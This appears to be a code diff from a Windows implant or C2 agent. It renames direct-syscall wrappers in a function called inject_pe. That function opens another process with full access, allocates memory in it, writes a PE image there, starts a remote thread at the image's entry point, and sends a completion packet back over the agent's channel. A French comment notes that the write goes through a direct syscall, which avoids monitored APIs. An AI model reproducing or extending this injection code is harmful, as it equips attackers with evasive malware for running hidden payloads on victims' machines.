@@ -87,7 +87,7 @@ static void inject_pe(void) {
     OBJECT_ATTRIBUTES obj_attr = {0};
     obj_attr.Length = sizeof(OBJECT_ATTRIBUTES);
 
-    NTSTATUS status = syscall_NtOpenProcess(
+    NTSTATUS status = nt_open_process(
         &hProcess,
         PROCESS_ALL_ACCESS,
         &obj_attr,
@@ -100,7 +100,7 @@ static void inject_pe(void) {
     void* base_addr = (void*)0x7FFF0000;
     SIZE_T region_size = pe_size;
 
-    status = syscall_NtAllocateVirtualMemory(
+    status = nt_allocate_virtual_memory(
         hProcess,
         &base_addr,
         0,
@@ -113,7 +113,7 @@ static void inject_pe(void) {
     if (!NT_SUCCESS(status)) {
         base_addr = NULL;
         region_size = pe_size;
-        status = syscall_NtAllocateVirtualMemory(
+        status = nt_allocate_virtual_memory(
             hProcess,
             &base_addr,
             0,
@@ -124,13 +124,13 @@ static void inject_pe(void) {
     }
 
     if (!NT_SUCCESS(status)) {
-        syscall_NtClose(hProcess);
+        nt_close(hProcess);
         return;
     }
 
     /* Écrit le PE en mémoire via syscall direct */
     SIZE_T written = 0;
-    status = syscall_NtWriteVirtualMemory(
+    status = nt_write_virtual_memory(
         hProcess,
         base_addr,
         pe_buffer,
@@ -139,7 +139,7 @@ static void inject_pe(void) {
     );
 
     if (!NT_SUCCESS(status)) {
-        syscall_NtClose(hProcess);
+        nt_close(hProcess);
         return;
     }
 
@@ -147,7 +147,7 @@ static void inject_pe(void) {
     void* entry = (void*)((uint8_t*)base_addr + pe_entry_rva);
     HANDLE hThread = NULL;
 
-    status = syscall_NtCreateThreadEx(
+    status = nt_create_thread_ex(
         &hThread,
         THREAD_ALL_ACCESS,
         NULL,
@@ -171,8 +171,8 @@ static void inject_pe(void) {
     pkt_set_payload(&pkt, &complete, sizeof(complete));
     send_packet(&pkt, 1);
 
-    if (hThread) syscall_NtClose(hThread);
-    syscall_NtClose(hProcess);
+    if (hThread) nt_close(hThread);
+    nt_close(hProcess);
 
     free(pe_buffer);
     pe_buffer = NULL;
